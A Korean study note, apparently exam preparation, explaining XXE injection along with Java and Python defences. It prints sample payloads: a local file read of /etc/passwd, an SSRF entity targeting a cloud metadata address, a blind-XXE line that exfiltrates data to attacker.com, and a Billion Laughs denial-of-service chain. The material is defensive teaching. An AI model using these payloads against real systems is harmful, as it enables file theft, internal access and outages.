## 핵심 인사이트 (3줄 요약)
> 1. **본질**: XXE (XML External Entity Injection, XML 외부 엔티티 인젝션)는 XML 파서가 외부 엔티티 선언을 처리할 때 로컬 파일 시스템 접근, SSRF, 서비스 거부 등의 공격이 가능한 취약점이다.
> 2. **가치**: XML을 입력으로 받는 모든 엔드포인트(파일 업로드, API, SOAP 웹서비스 등)가 잠재적 취약점이 될 수 있으며, 서버의 민감한 파일을 직접 읽어낼 수 있다.
> 3. **판단 포인트**: 방어의 핵심은 XML 파서에서 외부 엔티티 처리 기능을 비활성화(FEATURE_SECURE_PROCESSING)하는 것이며, 이는 한 줄 설정으로 가능하다.

---

## Ⅰ. 개요 및 필요성

XML (eXtensible Markup Language) 표준에는 DTD (Document Type Definition) 내에서 외부 엔티티를 선언하는 기능이 포함된다. 이 기능은 XML 문서에서 외부 파일이나 URL의 내용을 참조할 수 있게 설계됐지만, 악용 시 심각한 보안 문제를 야기한다.

XXE 취약점은 OWASP Top 10 2017에서 독립 항목(A04)으로 등재됐고, 2021에는 A03 인젝션 항목에 통합됐다. 여전히 매우 중요한 취약점으로 SOAP 기반 웹서비스, XML 파일 업로드 처리, Microsoft Office 파일 처리 등에서 자주 발견된다.

```text
┌──────────────────────────────────────────────────────────────┐
│                 XXE 기본 구조                                  │
├──────────────────────────────────────────────────────────────┤
│  <!DOCTYPE foo [                                              │
│    <!ENTITY xxe SYSTEM "file:///etc/passwd">                 │
│  ]>                                                          │
│  <foo>&xxe;</foo>                                            │
│                                                              │
│  XML 파서가 &xxe; 를 처리할 때:                               │
│  1. SYSTEM "file:///etc/passwd" 읽기 시도                     │
│  2. /etc/passwd 내용을 엔티티 값으로 치환                     │
│  3. <foo>[/etc/passwd 전체 내용]</foo> 로 응답                │
└──────────────────────────────────────────────────────────────┘
```

XXE가 중요한 이유는 공격 페이로드가 단 몇 줄의 XML이지만, 성공 시 서버의 `/etc/passwd`, SSH 키, 애플리케이션 설정 파일 등 민감한 로컬 파일을 직접 읽어낼 수 있기 때문이다.

📢 **섹션 요약 비유**: XXE는 편지(XML)에 "이 문장 대신 우리 집 열쇠 보관함 내용을 붙여넣어라"는 메모를 숨겨, 우체국(XML 파서)이 자동으로 실행해주는 공격이다.

## Ⅱ. 아키텍처 및 핵심 원리

### XXE 공격 유형

| 유형 | 설명 | 예시 |
|:---|:---|:---|
| 기본 XXE | 로컬 파일 읽기 | `SYSTEM "file:///etc/passwd"` |
| SSRF XXE | 내부 서비스 접근 | `SYSTEM "http://169.254.169.254/"` |
| Blind XXE | OOB 채널로 데이터 추출 | `SYSTEM "http://attacker.com/?data=..."` |
| Billion Laughs | 중첩 엔티티로 DoS | `&lol9;` → 기하급수적 메모리 소비 |
| 파라미터 엔티티 | 필터 우회 | `%` 파라미터 엔티티 활용 |

```text
┌──────────────────────────────────────────────────────────────┐
│               Billion Laughs 공격 (DoS)                       │
├──────────────────────────────────────────────────────────────┤
│  <!DOCTYPE lolz [                                            │
│    <!ENTITY lol "lol">                                       │
│    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> │
│    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">     │
│    ...                                                       │
│    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">     │
│  ]>                                                          │
│  <lolz>&lol9;</lolz>                                         │
│                                                              │
│  결과: 수십억 개의 "lol" 문자열 → 메모리 고갈 → 서버 다운    │
└──────────────────────────────────────────────────────────────┘
```

📢 **섹션 요약 비유**: Billion Laughs 공격은 마트 직원에게 "이거 복사해줘"→"이거 10개 복사해줘"→"이거 100개 복사해줘"를 연쇄적으로 시켜 복사기를 불태우는 것이다.

## Ⅲ. 비교 및 연결

| 항목 | XXE | SSRF | LFI (Local File Inclusion) |
|:---|:---|:---|:---|
| 공격 벡터 | XML 입력 | URL 파라미터 | 파일 경로 파라미터 |
| 파일 읽기 | 가능 | 제한적 | 가능 |
| 내부 요청 | 가능 (SSRF XXE) | 핵심 기능 | 불가 |
| 방어 핵심 | 외부 엔티티 비활성화 | URL 필터링 | 경로 검증 |

XXE는 JSON API로 전환한다고 해도 완전히 사라지지 않는다. DOCX, SVG, PDF, RSS 피드 등 XML 기반 포맷이 여전히 광범위하게 사용되며, 이를 처리하는 서버 측 라이브러리에도 XXE 위험이 존재한다.

📢 **섹션 요약 비유**: XXE, SSRF, LFI는 같은 동네 다른 길로 침입하는 절도범과 같다. 하나를 막아도 나머지 길이 열려 있으면 여전히 위험하다.

## Ⅳ. 실무 적용 및 기술사 판단

**Java에서 XXE 방어 (DocumentBuilderFactory)**:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// 외부 엔티티 완전 비활성화
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**Python (lxml) 방어**:
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_input, parser)
```

**추가 방어 전략**:
- 사용자 제공 XML은 최대한 JSON으로 대체
- XML 입력을 받아야 한다면 스키마 (XSD) 기반 검증 추가
- WAF에 XXE 페이로드 패턴 탐지 규칙 추가

📢 **섹션 요약 비유**: XXE 방어는 편지를 받는 우체국에 "메모 지시사항을 절대 실행하지 말고, 글자 그대로만 처리해라"는 규칙을 심어두는 것이다.

## Ⅴ. 기대효과 및 결론

XML 파서 설정 한 줄로 외부 엔티티를 비활성화하면 XXE 취약점 전체를 차단할 수 있다. 이는 가성비가 매우 높은 보안 조치다. 기존 코드 검토 시 XML 파서 초기화 부분을 우선적으로 점검해야 한다.

OWASP의 XXE Prevention Cheat Sheet는 언어·프레임워크별 안전한 파서 설정 방법을 상세하게 안내하며, 보안 코딩 가이드라인에 필수적으로 포함돼야 한다.

📢 **섹션 요약 비유**: XXE 방어의 완성은 편지 수신함에 "외부 참조 자동 실행 금지" 도장을 찍어두는 것이다 — 한 번 도장 찍으면 모든 편지에 자동 적용된다.
